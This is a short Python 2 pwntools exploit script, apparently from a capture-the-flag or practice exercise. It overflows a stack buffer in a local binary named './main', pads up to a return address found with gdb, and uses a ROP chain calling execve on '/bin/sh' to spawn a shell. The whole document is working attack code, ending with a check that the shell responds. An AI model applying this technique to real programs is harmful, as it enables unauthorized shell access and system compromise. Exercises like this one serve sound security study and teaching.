from pwn import *

context.clear(arch='amd64', kernel='amd64')

# Open the vulnerable binary

binary   = ELF('./main')

# Let's build our ROP stack

rop   = ROP(binary)
# The location of the variable `binsh` which contains the "/bin/sh" string
binsh = binary.symbols['binsh']
# Execve to get us a shell, passing in no arguments or env vars
rop.execve(binsh, 0, 0)
# Print it out because its fun to see
print rop.dump()

# Create exploit with padding

payloadStr = ''

# This needs to be improved, these were found with gdb and represent the
# address of the buffer and the return address we want to overwrite. We need to
# calculate the offset and place that many 'a's in front of our ROP payload so
# that when we write the whole thing into the buffer the first part of the ROP
# we just generated will be popped into %rip
bufferAddr = 0x7fffffffdb50
returnAddr = 0x7fffffffdb68
for i in xrange(0, returnAddr - bufferAddr):
    payloadStr += 'a'
# Now that its been padded put the exploit code in the right place
payloadStr += str(rop)

# Save exploit code

with open('payload', 'wb') as pFile:
    pFile.write(payloadStr)

# Let's try it out!

p = process(binary.path)
p.send(payloadStr)
time.sleep(1)
p.sendline('echo Hello from sh; exit')
print(p.recvline())
